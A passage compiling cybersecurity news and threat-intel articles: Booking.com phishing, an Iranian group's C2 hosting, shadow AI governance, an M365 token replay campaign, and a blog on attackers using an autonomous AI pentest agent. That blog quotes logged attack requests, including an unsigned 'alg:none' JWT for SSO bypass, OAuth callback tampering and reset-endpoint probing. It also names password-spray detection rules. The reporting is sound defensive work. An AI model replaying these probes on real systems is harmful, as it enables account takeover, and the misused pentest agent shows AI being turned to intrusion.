Commenting on the decision, Henna Virkkunen, the Commissions’ executive vice-president for tech sovereignty, security and democracy, said: “Europeans should be able to book their holidays without fear of being scammed. The DSA sets clear responsibilities on platforms to address these risks, and we must ensure that the leading booking platform in Europe takes those responsibilities seriously.”

The Commission emphasized that the opening of formal proceedings does not prejudge any final outcome or decision and is empowered to accept commitments offered by Booking.com to remedy the matters subject to the proceedings.

Booking.com Customers a Frequent Target for Phishing Attacks

Numerous phishing campaigns targeting Booking.com customers and partners have been observed by cybersecurity researchers in recent years. These campaigns have included threat actors accessing the personal details of Booking.com customers and spoofing the company’s email domains to send malicious messages.

In 2023, Secureworks, now part of Sophos, reported how cybercriminals deployed the Vidar infostealer to gain access partner hotels’ Booking.com credentials. This information was then used to send phishing emails to Booking.com customers and trick them into handing over their payment details, in many cases leading to money being stolen.

Microsoft reported a ClickFix campaign that impersonated Booking.com in March 2025. This began with the threat actor sending malicious email impersonating Booking.com to targeted individuals in North America, Oceania, South and Southeast Asia and Europe. The attack attempted to lure these individuals into downloading infostealer malware.

In June 2026, TrendAI Research identified a phishing campaign targeting Booking.com partner accommodations in Japan. These emails impersonated guest complaints and review requests to trick hotel staff into executing malicious files.

Title: ARTEX in the Wild: Storm-0940 Expands Targeting of IT and Software Vendors
Context: What it looked like in the logs We analyzed these attack patterns using HTTP access logs collected via Wiz Agentless Workload Detection, alongside identity provider logs such as...
Full Text:
Throughout October 2026, we identified an actor using tooling associated with ARTEX, an autonomous AI penetration-testing agent, to target multiple IT and software vendors. The activity focused on identity providers (Okta, Entra, Cognito) and abuse of Microsoft 365 integrations. We observed repeated attempts to uncover authentication bypasses, enumerate APIs, and access customer data (of the targeted vendors) across multiple environments.

Our observations overlap with Microsoft's recent report on ​​Storm-0940, a Chinese-state aligned actor - linked to the recent supply-chain attack involving stolen vendor credentials and downstream Microsoft 365 tenants.

However, we have additionally observed the same infrastructure, tooling, and attack patterns targeting the sector as a whole. Pivoting on identified TTPs and IOCs, we have also identified the same actor expanding their attempted supply chain compromises into other software sectors.

In this blog, we will describe the repeatable patterns and methodologies the ARTEX-using actor applied across multiple environments and cloud providers, with examples taken from real world attacks.

What is ARTEX?

ARTEX is an open-source autonomous penetration testing framework. A Chinese developer published it on GitHub in July 2026, and it won Baidu's "Agent+" red team challenge that September. In practice, an operator supplies a target and an objective. A planner agent then chooses the next step, worker agents run tools like nmap, curl, and Impacket, and every result feeds a shared graph of assets and findings.

Attackers picked it up within weeks. ARTEX artifacts surfaced in attacks on South Korean banks in late September and attacks on Japanese companies in October. Microsoft and Zscaler have since tied it to two separate actors. The developer made the tool closed-source on October 8. By then, the code had more than 12,000 forks.

A repeatable playbook

Across the investigated environments, we observed a consistent sequence of reconnaissance and attack attempts:

Map the application: Download JavaScript bundles, exposed source maps, runtime configurations, and Swagger/OpenAPI documentation to discover internal API routes and application functionality.

Probe authentication: Repeatedly initiate sign-in flows, manipulate OAuth callbacks and state parameters, test unsigned JWTs, and probe SSO and Microsoft 365-specific endpoints.

Attack identity providers and login flows: Password-spray corporate Okta and Entra ID environments, and target internal and proprietary application login pages.

Abuse account recovery: Repeatedly invoke password-reset, username-recovery, activation, and reset-token endpoints.

Test tenant isolation: Register accounts using disposable email addresses where possible, then manipulate predictable identifiers to probe for broken access controls and unauthorized cross-tenant data access.

Adapt to defense mechanisms: Rotate IP addresses when blocked, and constantly circulate user agents.

What it looked like in the logs

We analyzed these attack patterns using HTTP access logs collected via Wiz Agentless Workload Detection, alongside identity provider logs such as AWS Cognito events, Entra sign-in activity, and Okta authentication logs.

Targeting Internal Applications

The agent's first move across all observed instances of the attack was always to read the application itself. Requests like these showed up minutes after first contact:

GET /packs/js/main-3a9f...js.map GET /assets/config.json GET /env.js GET /swagger/?format=openapi

Not long after, it started calling internal API routes by name. The only place those route names appear is in the source maps it had just downloaded.

Account recovery got the same treatment. The agent checked which usernames existed, then hammered the reset endpoints:

GET /Account/ValidateUserName?UserName=admin POST /api/v1/Users/GeneratePasswordResetToken → 204 POST /forgot_password

Where it could sign up, it did, using a throwaway mailbox from a free temporary-email service. Then, it immediately tried to look at someone else's data:

POST /v2/register_user → 201 POST /confirm → 200 GET /company/1/logins → 403 GET /api/users/generate_redirect_link?role=admin → 401

Before every fuzzing run, it checked what a baseline "not found" response looked like:

GET /zzz-nonexistent-xyz123

Targeting OAuth Identity Providers

When probing Microsoft OAuth flows, the agent directly manipulated the callback endpoint by injecting fabricated authorization codes and malformed state parameters, while also attempting to bypass authentication using unsigned JWTs:

GET /sign_in/oauth/microsoft/callback?code=AAAA&state=notvalidb64!! GET /sso?jwt=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.

That second token simply decodes to {"alg":"none"} and {"email":"test@test.com"}. The agent bombarded more than 60 variations of SSO routes with this payload in just two minutes.

On AWS Cognito, we observed patterns mirroring the account recovery abuse seen in proprietary apps. This activity was reflected in events like InitiateAuth, ForgotPassword, and ResendConfirmationCode. These requests originated from the same mix of user agents observed in earlier attacks, including benign-looking programmatic clients like boto and python-urllib.

The agent also attempted to provision new identities directly, invoking the AWS Cognito SignUp API while cycling through its pool of user agents.

Password Spraying

We also tracked a massive password spray campaign across many of the observed targets. The activity was IDP-agnostic, hitting both Entra and Okta, and displayed several unique, AI-driven characteristics.

The attacks targeted hundreds of users and were executed in highly coordinated bursts. Each burst featured:

Dedicated user agents: A unique user-agent string was assigned to each burst, distinct from those used in previous waves.

Precise timing: The median gap between authentication attempts was strictly one second.

Sustained execution: Individual bursts lasted anywhere from 20 to 60 minutes.

Role-based targeting: The agent primarily focused on accounts belonging to software engineers.

Repeated attempts: Some individual users were subjected to more than a dozen login attempts.

Relentless by Design

The activity was persistent and highly automated. Some sessions lasted 24–30 hours, and when IPs were blocked, new addresses appeared within minutes.

In one session, the agent cycled through a dozen variations of the same SSO endpoint (/sso, /sso/, /sso/login, /sso/jwt, /jwt/sso…), each with and without the same forged token, at a rate of about one request per second. When a login page started rate-limiting the activity, the agent simply switched to a different endpoint on the same host and carried on.

We observed more than 15 different user-agent strings across the victims:

Python-based clients and curl;

Truncated Chrome strings and headless browsers with seemingly random version numbers.

More distinctive, self-describing identifiers, such as ReconProbe/1.0.

This variety, combined with the consistent attack patterns and ARTEX-related indicators, helped us connect the activity across multiple organizations.

Although most of these attempts failed, the true threat lies in the methodology. While a human attacker is bound by time constraints and fatigue, an autonomous agent does not give up. It simply continues to iterate until it finds a single weak point.

A clearly agentic attack

None of the individual techniques observed are novel. However, together the agent behind this attack is illuminated. There are a few clear signals:

Steps were chained automatically: when sign-up was open, it registered with a disposable mailbox, confirmed the account, and immediately requested another company's data.

Each automated step used the output of the last one: internal API routes are called by name minutes after pulling the source maps

Adaptation was automatic: when a login page started rate-limiting, the agent moved to a different endpoint on the same host. When an IP was blocked, a new one appeared within minutes.

Not all attacks were logical: a human attacker of this skill level is unlikely to spend their time testing generic payloads on the heavily scrutinized Microsoft OAuth flows.

Staying Ahead of AI-Powered Attacks

As AI makes reconnaissance and exploitation attempts faster and easier to scale, defenders need to shorten the gap between exposure and remediation. Learn more about how to prepare with Wiz's AI Threat Readiness Framework.

In addition, Wiz's AI Red Agent continuously and autonomously conducts offensive tests, helping reduce exposure at the speed of AI - evening the scales.

Wiz customers can refer to our Threat Intel Center Alert: ARTEX: Agentic AI Campaign Enables Cloud and Supply Chain Compromise

Existing detection rules can also effectively identify this activity, for example:

Numerous Failed Login Attempts To Multiple Users Followed By A Successful Login To Admin User

Potential Password Spray Attack From Single IP

Okta Users Password Spray

The relentless behavior also creates predictable patterns that can also be detected by rules such as "Unusual Mass Access Denied Activity."

Title: Iranian Hacking Group Found Hosting C2 Infrastructure in the US
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
An Iranian nation-state cyber threat group has been discovered using command-and-control (C2) servers based in the US to support its malware delivery and cyber-espionage campaigns.

The activity was identified by cybersecurity researchers at Semperis, who published their findings on October 22. The Iranian group is known as ‘Prince of Persia’, which has been active for around two decades.

Prince of Persia targets public and private sector organisations across the US, Europe and the Middle East, as well as dissidents and others opposed to the Iranian regime.

The multiple forms of malware used in Prince of Persia campaigns provide attackers with intrusive data exfiltration capabilities. This includes the ability to steal sensitive documents, as well as secretly taking screenshots and capturing audio recorded by the infected device.

Forms of malware identified as part of the latest Prince of Persia campaign include Foudre, a first stage malware loader and Tonnerre, a second stage malware which provides the attackers with what researchers describe as full surveillance capabilities.

The campaigns also involve a more recently identified malware known as Tornado, which builds on the codebase of previous malware. Tornado has the ability to use both HTTPS and the Telegram API as a covert C2 channel, blending in with legitimate network traffic to bypass firewalls and evade detection.

Advanced Anti-Detection Capabilities

Prince of Persia has been known to secretly hide its activity on European hosting services and virtual private servers, but anti-detection capabilities of the malware initially made it difficult for researchers to identify how the latest campaign was being hosted.

According to Tomer Bar, AVP of security research at Semperis, Prince of Persia seemed to go dark in February this year, coinciding with US and Israeli strikes against Iran.

“This isn’t unusual given that geopolitical conflict involving Iran leads to downtime with the threat group,” said Bar.

However, information in the Tornado malware resulted in researchers being able to identify where the campaign was being hosted and it was found to be a US hosting company.

While it isn’t unusual for threat groups to hide their activity within US hosting providers, it is the first time an Iranian threat group has been identified as hosting their activity on US servers in at least 12 years.

“This is the last place we expected to find Prince of Persia hiding,” Bar added.

While Prince of Persia activity is highly targeted rather than widespread, the group has been a persistent cyber threat to organizations for almost two decades. To help ensure protection from attacks by the group, Semperis has recommended the following actions:

Ensure that your security controls are up to date

Monitor for any unusual Telegram traffic.

Ensure that your operating systems are fully updated

Title: How to contain shadow AI, as it takes on multiple forms and spreads throughout your environment
Context: That way, you can see how your security issues combine to create attack paths that lead to your most critical systems and data
Full Text:
Shadow AI used to be confined to a few simple scenarios, such as AI chatbots and AI browser extensions. Today, it spans a broad spectrum of complex vectors, making it harder to detect and control. In the latest installment of our Cybersecurity Awareness Month blog series, learn how employee security training, AI usage governance, and exposure management can help you tackle shadow AI successfully.

Key takeaways

Integrating shadow AI into security awareness training helps employees recognize its risks and learn how to safely adopt AI tools. Security teams should foster open communication with employees and try to understand why they use unsanctioned AI products.

Shadow AI now spans local models, AI coding assistants, autonomous agents, and many other asset types across your environment, making it a pervasive and complex problem.

You can reduce shadow AI incidence by enacting an AI acceptable use policy that provides clear guidelines and a list of approved AI tools, and by addressing shadow AI as part of your unified exposure management program.

It’s an ordinary workday at a typical mid-to-large enterprise, and the following is happening without the knowledge of the IT and security departments:

A marketing manager installs an unvetted, open-source Model Context Protocol (MCP) server to secretly bridge his desktop AI assistant with the company’s internal customer database.

A sales executive downloads a free AI browser extension to summarize a web page, unknowingly granting a third party read-access to her confidential CRM dashboards.

An accounting supervisor creates custom AI chatbot skills to automate his reporting, feeding unredacted financial projections into a public generative AI tool.

An engineer bypasses software restrictions to download and run an unvetted, locally hosted AI model, creating a massive blind spot for endpoint security.

A business analyst hands over her broad administrative credentials to a consumer-grade AI agent so it can autonomously crawl the company’s private data warehouse.

A developer pastes proprietary, unreleased source code into a free, web-based AI assistant for quick debugging, inadvertently surrendering corporate IP to a public model’s training set.

Yes, we’ve come a long way from the days when instances of shadow AI consisted mostly of employees oversharing work information with their personal AI chatbot. With AI now permeating enterprises’ operations, shadow AI has spread and morphed accordingly across the attack surface. It has become riskier and harder to detect, especially as autonomous AI agents proliferate.

For example, security incidents involving organizations’ shadow AI assets have more than doubled to 43%, compared with 20% last year, according to IBM’s “2026 Cost of a Data Breach Report.” Meanwhile, the average data breach cost of shadow AI-related incidents hit $5.39 million, about $400,000 above the global average.

IBM's report found a direct impact on data privacy, operations, and compliance:

Almost half of shadow AI security incidents resulted in data loss or data compromise

42% caused operational disruption

21% triggered regulatory fines

During a 30-day period earlier this year, the Tenable One Exposure Management Platform found 457 million security issues across 7,000 customer environments using 274 detection plugins built specifically for AI. That averaged out to about 62,000 AI-related exposures per customer.

“The enterprise AI landscape of 2026 bears little resemblance to the AI landscape of even three years ago,” the Cloud Security Alliance (CSA) wrote in its April report, “The Invisible Enterprise: Shadow AI and the Ungoverned Frontier.”

Because AI adoption has “dramatically outpaced” organizations’ AI governance, many enterprises now have a dangerous “invisible layer of AI infrastructure” that hasn’t been inventoried, and thus isn’t subjected to policy enforcement, access controls, or audits, according to the CSA report.

In this third installment of Tenable’s weekly Cybersecurity Awareness Month blog series, we’ll unpack best practices organizations can adopt to tackle shadow AI in its multiple forms — AI code assistants, models, applications, APIs, embedded features, agents, MCP servers, training data, browser extensions, and more — and mitigate its risks, such as compliance failures, system breaches, and data leaks.

3 steps to help you mitigate the risk from shadow AI

1. Boost employee and leadership awareness and education

A logical place to start your campaign against shadow AI is by teaching employees and leaders how to recognize and prevent the issue.

Employees

Just last month, the U.K. government stressed how important it is for organizations to address the human factor in shadow AI, specifically the disconnect between employees’ fast adoption and organizations’ lag in approving AI tools and setting AI usage policies.

For example, 34% of employees polled in Thomson Reuters’ “Future of Professionals 2026” report admitted to knowingly and deliberately using AI wares their organization hasn’t approved.

Why? “They are frustrated by the quality of sanctioned tools or the lack of a clear AI strategy,” reads a Thomson Reuters article about the report, published in June.

The U.K. National Cyber Security Centre (NCSC) recommends focusing on three key elements:

Understand why staffers use unapproved AI tools.

Establish a “positive cybersecurity culture” marked by open communication between employees and the security team.

Securely integrate AI systems into the workplace.

“By raising awareness of the risks of shadow AI use within your organization and understanding the needs of employees, you can help them get the benefits of new technologies while using them securely,” an NCSC cloud researcher wrote in the blog “The hidden risks of shadow AI.”

In other words, focus on employee education, not punishment, and include shadow AI in your security awareness program training.

Business unit leaders

Proactively reach out to business unit leaders to learn about the AI tools they’re using, their reasons for using them, and the benefits they yield. Engaging in this needs-assessment exercise can help you decide which AI tools to allow and which ones to prohibit.

2. Establish a clear AI governance policy

Avoid being seen as an enemy of AI adoption. Extremely restrictive approaches, such as “block by default” policies, tend to backfire because they drive employees and teams to push their AI usage further underground, especially if these tools boost their productivity.

Instead, you should adopt an AI acceptable use policy that outlines clear rules for who can use AI, which tools they can use, and what data they can input, in a way that doesn’t compromise security and compliance.

Your AI policy should also clarify levels of accountability by outlining the responsibilities of employees, managers, and the AI governance team. For example, it should stress that employees must verify the accuracy of AI-generated content, because each individual is ultimately responsible for the quality of their work.

The comprehensive policy should clearly outline AI usage guardrails, such as rules for data handling, detail the formal process and criteria that the security and IT teams will use for approving and adopting AI tools, and provide a curated list of authorized tools.

It should further help you assess whether you should outright block a discovered shadow AI tool, or whether you can allow it with the appropriate controls.

Some questions to ask:

Does the AI vendor claim ownership of what your users input into its tool?

Does the tool encrypt data in transit and at rest?

What are the vendor’s vulnerability and incident disclosure processes?

Does the product comply with regulations relevant to your organization, like HIPAA?

Does the vendor use your data to train public AI models?

In which geographic region does the vendor house your data?

Which types of industry compliance does the AI vendor adhere to?

Finally, the AI usage policy should be a living document your organization continually revises, as AI technology advances and the organization’s usage evolves.

“Leaders should focus on creating a governance framework that balances innovation with risk management, ensuring employees feel empowered to use GenAI responsibly,” reads Deloitte’s “GenAI Workforce Survey,” which was published in September. The report found that 31% of U.K. employees use AI tools without their organizations’ permission.

3. Address shadow AI as part of your broader exposure management program

With AI now pervasive across most enterprises, shadow AI is present throughout your IT environment in a wide variety of manifestations. This is precisely the type of complex and multidimensional security issue that a unified exposure management platform helps untangle.

At Tenable, we believe that trying to detect and control shadow AI as a standalone problem with isolated point tools is the wrong approach.

To successfully mitigate AI security risks, including shadow AI, you need to gather contextually rich AI security data, so you can correlate and analyze it alongside your other exposure data. That way, you can see how your security issues combine to create attack paths that lead to your most critical systems and data.

These are some key ways in which an exposure management platform can help you address shadow AI risk.

Obtain comprehensive visibility of your AI environment via a continuously updated inventory of your AI assets – what they are, who and what can access them, and which data they can access – wherever they are in your environment including in your:

Data centers

Endpoints

Web apps

Cloud workloads

Network traffic

Application development pipelines

Enterprise AI platforms

Operational technology (OT) systems

IoT infrastructure

Detect shadow AI assets’ security flaws, including vulnerabilities, misconfigurations, excessive permissions, insecure output handling, and exposed training data.

Contextually map and prioritize the security issues that require immediate attention across your entire attack surface based on factors like AI asset criticality and business impact.

Take action and automate remediation, including by leveraging agentic AI capabilities, to carry out the fixes needed to close your shadow AI exposures.

Reduce the risk of data getting shared improperly via AI prompts and uploads by:

Discovering and classifying sensitive data

Auditing AI assets’ permissions and enforcing least-privilege policies

Monitoring data flows in real time

Detecting and blocking sensitive intellectual property, proprietary source code, and customers’ personally identifiable information (PII) before exposure or compromise

Check back next week when we’ll finish our Cybersecurity Awareness Month series with a blog about the cybersecurity challenges of state and local governments. Read the first two blogs in the series:

How to mitigate the risk from AI-generated apps built by your '‘citizen coder’ employees

Title: M365 Token Spray and Replay Campaign Compromises Business Email Accounts
Context: Microsoft independently flagged the same infrastructure: Microsoft Entra ID Protection raised verified threat actor IP detections against 193
Full Text:
Acknowledgments: Special thanks to Anton Ovrutsky for his contributions to this investigation and writeup.

Background

Between July 14, 2026 and September 22, 2026, Huntress detected 497 Microsoft 365 sign-in events across 79 victim organizations related to a token replay campaign using an IP address block from the German hosting provider 1337 Services GmbH. Rather than guessing passwords, the attacker replayed sign-in tokens stolen from victims, and we've traced more than 200,000 failed login attempts from the campaign window back to the 193.26.115[.]0/24 IP range.

Figure 1: Overall statistics of the activity Huntress observed

Figure 2: Successful sign-in events using token replays over the course of the campaign

Also known as AS210558, 1337 Services GmbH is incorporated in Hamburg, Germany. While 1337 Services GmbH offers a legitimate IP hosting service, attackers use these kinds of ISP providers to host malicious traffic, a tactic referred to as "bring your own IP" (BYOIP). A February 2025 Krebs on Security article suggests that 1337 Services GmbH's founder may have operated the Cracked cybercrime forum.

The Microsoft accounts were compromised without the attacker ever needing a password. In an adversary-in-the-middle (AiTM) attack, the victim signs in through a relay that sits between them and Microsoft. The relay passes the real login page and MFA prompt through to the victim, then keeps the "proof of login" token Microsoft issues once the victim finishes signing in. Because that token is minted after MFA, whoever holds it doesn't need to pass MFA again. The threat actor then replayed the stolen tokens from their own machines in automated sign-in attempts against Microsoft 365 services. Because the attacker replayed many stolen tokens at volume across many organizations, we refer to this as "token spraying:" the same pattern as password spraying, but with stolen tokens instead of guessed passwords.

In this campaign, tokens came from multiple sources: AiTM relays behind fake sign-in pages, device-code phishing, and social engineering during a legitimate login process.

Huntress first detected this activity on July 14, 2026, when a sign-in from 193.26.115[.]221 came from an Entra-joined device named DESKTOP- plus eight hex characters. Microsoft independently flagged the same infrastructure: Microsoft Entra ID Protection raised verified threat actor IP detections against 193.26.115[.]221, 193.26.115[.]72, 193.26.115[.]16, and 193.26.115[.]21 in multiple customer tenants. Microsoft describes this detection as "sign-in activity that is consistent with known IP addresses associated with nation state actors or cyber crime groups, based on Microsoft Security Intelligence (MSTIC)."

A July 21 detection from 193.26.115[.]199 gave us a view of how the attacker was able to steal and reuse a token in less than an hour:

Time (UTC)

17:43:15

18:08:50

A new authenticator app, labeled "iPhone 13", was activated on the account

Registering their own authenticator app is a persistence method. A stolen session token eventually expires or gets revoked, but an MFA method stays on the account. With their own authenticator registered, the attacker can complete MFA for new sign-ins whenever they want, and that access survives a password reset unless someone audits the account's MFA methods and removes the rogue one. In 19 organizations, the victim's existing MFA methods were wiped and a new method registered within three hours of the first sign-in from a campaign address.

Rogue devices served the same purpose. Across the compromises we investigated, the threat actor registered at least 48 fake computers in victim organizations' Microsoft directories. A registered device can give the attacker a more durable way to request tokens than the stolen session alone, and it stays in the directory until someone deletes it.

We also observed the threat actor setting up hidden email rules in victim inboxes that quietly moved messages from specific contacts out of sight. In at least one case, the threat actor used the email account to send a payroll-related email to an outside contact. None of the email rules were created from the 1337 Services GmbH network; each one came from a different rented or VPN address.

Technical Details

Over the 10-week campaign, the threat actor replayed stolen Microsoft 365 sessions using rented hosts in one block of IP addresses, 193.26.115[.]0/24. They used six addresses in the /24 range, one after another:

Figure 3: IP addresses used throughout the token spraying campaign

We can't state with certainty why the operator rotated addresses, but the effect is clear. A block, alert, or Conditional Access rule written for one address does nothing against the next, and Microsoft flagged addresses individually: its incidents named 193.26.115[.]221, 193.26.115[.]72, 193.26.115[.]16, and 193.26.115[.]21, not the range. Several switches followed a quiet period, about two weeks between Phases 1 and 2 and a week before the September 22 takeover. Blocking any single address would have stopped one phase at most. Blocking the /24 would have covered all six main replay hosts, though the operator also used a few other 1337 Services addresses outside it.

Two tiers: relays capture, 1337 replays

The operator split the attack across two kinds of infrastructure. First, the victim signs in through an AiTM relay. The relay passes the victim's MFA prompt through and keeps the resulting session. Then, within minutes, the stolen session reappears from a 1337 Services address. On July 21, the gap between the victim reaching the MFA prompt and the hijacked session appearing was 12 minutes. On September 22, it was four.

Because the two halves sit on different providers, blocking the 1337 range doesn't stop credentials from being captured, and blocking a relay doesn't stop replay of tokens that were already stolen.

Two builds

The replay hosts ran two distinct toolsets, which we refer to as Build A and Build B:

Build A: Scripted token replay
